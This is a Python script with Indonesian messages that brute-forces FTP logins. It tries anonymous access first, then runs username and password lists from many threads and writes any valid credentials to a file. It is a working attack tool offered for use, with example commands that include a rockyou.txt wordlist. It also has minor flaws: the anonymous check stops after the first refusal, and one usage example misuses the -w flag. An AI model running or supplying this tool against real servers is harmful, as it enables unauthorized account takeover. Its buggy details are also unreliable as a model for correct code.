#!/usr/bin/env python3
"""
FTP Bruteforcer
Brute force FTP login dengan username dan password list.
Mendukung anonymous login check dan multi-threading.
Usage:
  python ftp_bruteforce.py -t 192.168.1.1 -u admin -w passwords.txt
  python ftp_bruteforce.py -t 192.168.1.1 -U users.txt -P passwords.txt --threads 20
  python ftp_bruteforce.py -t 192.168.1.1 --password hunter2 -U users.txt -o hasil.txt
"""

import ftplib
import argparse
import sys
import socket
import threading
import queue
import os


def load_file(filepath):
    try:
        with open(filepath, encoding="utf-8", errors="ignore") as f:
            items = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        return items
    except FileNotFoundError:
        print(f"[!] File tidak ditemukan: {filepath}")
        sys.exit(1)
    except PermissionError:
        print(f"[!] Permission denied: {filepath}")
        sys.exit(1)


def try_anonymous(target, port, timeout):
    for anon_pass in ("anonymous", "ftp@", "guest", ""):
        try:
            conn = ftplib.FTP()
            conn.connect(target, port, timeout=timeout)
            conn.login("anonymous", anon_pass)
            conn.quit()
            return anon_pass
        except ftplib.error_perm:
            return None
        except (ftplib.error_temp, ftplib.error_reply, socket.error, OSError):
            return None
    return None


def try_ftp(target, port, username, password, timeout):
    try:
        conn = ftplib.FTP()
        conn.connect(target, port, timeout=timeout)
        conn.login(username, password)
        conn.quit()
        return True
    except ftplib.error_perm:
        return False
    except (ftplib.error_temp, ftplib.error_reply, socket.timeout, socket.error, OSError, EOFError):
        return None


def worker(
    q,
    target,
    port,
    timeout,
    found_event,
    found_lock,
    results,
    output_path,
    progress_lock,
    attempt_counter,
):
    while not found_event.is_set():
        try:
            username, password = q.get(timeout=1)
        except queue.Empty:
            break

        with progress_lock:
            attempt_counter[0] += 1
            current = attempt_counter[0]
        print(f"[*] [{current}] Mencoba {username}:{password}   ", end="\r")

        result = try_ftp(target, port, username, password, timeout)

        if result is True:
            with found_lock:
                if not found_event.is_set():
                    print(f"\n[+] BERHASIL! {username}:{password}")
                    results.append(f"{username}:{password}")
                    found_event.set()
                    if output_path:
                        try:
                            with open(output_path, "w") as f:
                                f.write(f"{username}:{password}\n")
                            print(f"[+] Kredensial disimpan ke: {output_path}")
                        except OSError as e:
                            print(f"[!] Gagal menyimpan ke {output_path}: {e}")
        elif result is None:
            print(
                f"\n[!] Koneksi error untuk {username}:{password} — host mungkin down atau menolak"
            )
            continue

        q.task_done()


def main():
    parser = argparse.ArgumentParser(
        description="FTP Login Bruteforcer — Brute force FTP dengan multi-threading",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Contoh:
  python ftp_bruteforce.py -t 10.0.0.1 -u admin -P passlist.txt
  python ftp_bruteforce.py -t 10.0.0.1 -U users.txt -w rockyou.txt --threads 20
  python ftp_bruteforce.py -t 10.0.0.1 --username anonymous --password anonymous
  python ftp_bruteforce.py -t 10.0.0.1 -U users.txt -P pass.txt -o result.txt""",
    )
    parser.add_argument("-t", "--target", required=True, help="FTP host/alamat IP target")
    parser.add_argument("-p", "--port", type=int, default=21, help="FTP port (default: 21)")
    parser.add_argument("-u", "--username", help="Single username")
    parser.add_argument("-U", "--userlist", help="File berisi daftar username")
    parser.add_argument("-w", "--password", help="Single password")
    parser.add_argument("-P", "--passlist", help="File berisi daftar password")
    parser.add_argument(
        "--timeout", type=int, default=5, help="Koneksi timeout dalam detik (default: 5)"
    )
    parser.add_argument(
        "-T", "--threads", type=int, default=10, help="Jumlah thread konkuren (default: 10)"
    )
    parser.add_argument(
        "-o", "--output", help="File output untuk menyimpan kredensial yang ditemukan"
    )
    args = parser.parse_args()

    if args.username:
        users = [args.username]
    elif args.userlist:
        users = load_file(args.userlist)
    else:
        print("[!] Harus menyediakan --username atau --userlist")
        sys.exit(1)

    if args.password:
        passwords = [args.password]
    elif args.passlist:
        passwords = load_file(args.passlist)
    else:
        print("[!] Harus menyediakan --password atau --passlist")
        sys.exit(1)

    total = len(users) * len(passwords)
    print(f"[*] Target: {args.target}:{args.port}")
    print(f"[*] Users: {len(users)}, Passwords: {len(passwords)}")
    print(f"[*] Total percobaan: {total}")
    print(f"[*] Threads: {args.threads}")

    if args.output:
        out_dir = os.path.dirname(os.path.abspath(args.output)) or "."
        if not os.path.isdir(out_dir):
            print(f"[!] Direktori output tidak ada: {out_dir}")
            sys.exit(1)

    print("[*] Mengecek anonymous login...")
    anon_pass = try_anonymous(args.target, args.port, args.timeout)
    if anon_pass is not None:
        print(f"[+] Anonymous login BERHASIL! (password: '{anon_pass}')")
        if args.output:
            try:
                with open(args.output, "w") as f:
                    f.write(f"anonymous:{anon_pass}\n")
                print(f"[+] Disimpan ke: {args.output}")
            except OSError as e:
                print(f"[!] Gagal menyimpan: {e}")
        sys.exit(0)
    else:
        print("[*] Anonymous login tidak tersedia — lanjut brute force")

    if "anonymous" in (u.lower() for u in users):
        print("[*] Melewati user 'anonymous' (sudah dicoba)")
        users = [u for u in users if u.lower() != "anonymous"]
        if not users:
            print("[!] Tidak ada user tersisa untuk brute force")
            sys.exit(0)

    print("-" * 60)

    q = queue.Queue()
    num_threads = min(args.threads, total)
    found_event = threading.Event()
    found_lock = threading.Lock()
    progress_lock = threading.Lock()
    results = []
    attempt_counter = [0]

    for u in users:
        for pw in passwords:
            q.put((u, pw))

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(
            target=worker,
            args=(
                q,
                args.target,
                args.port,
                args.timeout,
                found_event,
                found_lock,
                results,
                args.output,
                progress_lock,
                attempt_counter,
            ),
            daemon=True,
        )
        t.start()
        threads.append(t)

    try:
        for t in threads:
            while t.is_alive():
                t.join(timeout=0.5)
    except KeyboardInterrupt:
        print("\n[!] Dihentikan oleh user")

    if not found_event.is_set():
        print(f"\n[-] Tidak ada kredensial valid ditemukan ({attempt_counter[0]} percobaan)")


if __name__ == "__main__":
    main()
